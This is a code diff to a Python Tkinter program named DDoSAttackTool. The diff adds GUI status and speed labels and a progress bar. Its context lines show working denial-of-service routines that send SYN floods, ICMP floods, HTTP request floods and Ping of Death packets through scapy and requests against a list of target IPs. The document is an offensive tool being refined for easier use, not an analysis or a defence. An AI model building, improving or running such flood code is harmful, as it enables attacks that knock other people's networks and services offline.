@@ -28,8 +28,6 @@ class DDoSAttackTool:
         self.attack_num = 0
         self.stop_attack_flag = False
         self.total_bytes_sent = 0
-        self.attack_speed_label = tk.Label(self.root, text="Attack Speed: 0 GB/s")
-        self.attack_speed_label.pack()
 
         self.create_gui()
 
@@ -56,6 +54,12 @@ class DDoSAttackTool:
         self.progress_bar = ttk.Progressbar(self.root, orient="horizontal", length=200, mode="determinate")
         self.progress_bar.pack()
 
+        self.attack_speed_label = tk.Label(self.root, text="Attack Speed: 0 GB/s")
+        self.attack_speed_label.pack()
+
+        self.attack_status_label = tk.Label(self.root, text="Attack Status: Not in Progress")
+        self.attack_status_label.pack()
+
         tk.Button(self.root, text="Start Attack", command=self.start_attack).pack()
         tk.Button(self.root, text="Stop Attack", command=self.stop_attack).pack()
 
@@ -72,12 +76,30 @@ class DDoSAttackTool:
         self.attack_start_time = time.time()
         self.total_bytes_sent = 0
 
+        # Update the attack status label
+        self.attack_status_label.config(text="Attack Status: In Progress")
+        self.root.update()
+
         with ThreadPoolExecutor() as executor:
             for target in target_ips:
                 if self.stop_attack_flag:
                     break
                 executor.submit(attack_function, target, port, num_packets, burst_interval)
                 time.sleep(1)  # Check the flag every second
+
+                # Update the attack speed label
+                self.attack_speed_label.config(text=f"Attack Speed: {self.get_attack_speed():.2f} GB/s")
+                self.root.update()
+
+                # Increment the progress bar value
+                self.progress_bar["value"] += 1
+                self.root.update()
+
+        # Update the attack status label
+        self.attack_status_label.config(text="Attack Status: Not in Progress")
+        self.root.update()
+
+        print(f"Final attack speed: {self.get_attack_speed():.2f} GB/s")
 
     def stop_attack(self):
         self.stop_attack_flag = True
@@ -120,7 +142,6 @@ class DDoSAttackTool:
                 self.attack_num += 1
                 packet_size = len(b"")  # Replace b"" with the actual packet data
                 self.total_bytes_sent += packet_size
-                self.update_attack_speed()
                 print(f"Sent {self.attack_num} packet to {target_ip} through port: {port}")
                 time.sleep(burst_interval)
                 if self.stop_attack_flag:
@@ -135,7 +156,6 @@ class DDoSAttackTool:
                 for _ in range(num_packets):
                     scapy.send(scapy.IP(dst=target) / scapy.ICMP())
                     self.attack_num += 1
-                    self.update_attack_speed()
                     print(f"Sent {self.attack_num} ICMP echo request to {target}")
                     time.sleep(burst_interval)
         except Exception as e:
@@ -149,7 +169,6 @@ class DDoSAttackTool:
                     self.attack_num += 1
                     packet_size = len(scapy.IP(dst=target) / scapy.TCP(dport=port, flags="S"))
                     self.total_bytes_sent += packet_size
-                    self.update_attack_speed()
                     print(f"Sent {self.attack_num} SYN packet to {target} through port: {port}")
                     time.sleep(burst_interval)
                 port = (port + 1) % 65535  # Move this line outside the inner loop
@@ -171,7 +190,6 @@ class DDoSAttackTool:
                         self.attack_num += 1
                         packet_size = len(requests.get(url, headers=headers).content)
                         self.total_bytes_sent += packet_size
-                        self.update_attack_speed()
                         print(f"Sent {self.attack_num} HTTP request to {url}")
                         time.sleep(burst_interval)
                         bar.update(i + 1)
@@ -186,16 +204,15 @@ class DDoSAttackTool:
                     self.attack_num += 1
                     packet_size = len(scapy.IP(dst=target) / scapy.ICMP() / ("X" * 60000))
                     self.total_bytes_sent += packet_size
-                    self.update_attack_speed()
                     print(f"Sent {self.attack_num} oversized ICMP packet to {target}")
                     time.sleep(burst_interval)
         except Exception as e:
             print("An error occurred during the Ping of Death attack:", e)
 
-    def update_attack_speed(self):
+    def get_attack_speed(self):
         attack_duration = time.time() - self.attack_start_time
-        current_attack_speed = self.total_bytes_sent / (attack_duration * 1024 * 1024 * 1024)
-        self.attack_speed_label.config(text=f"Attack Speed: {current_attack_speed:.2f} GB/s")
+        attack_speed = self.total_bytes_sent / (attack_duration * 1024 * 1024 * 1024)
+        return attack_speed
 
     def run(self):
         self.root.mainloop()
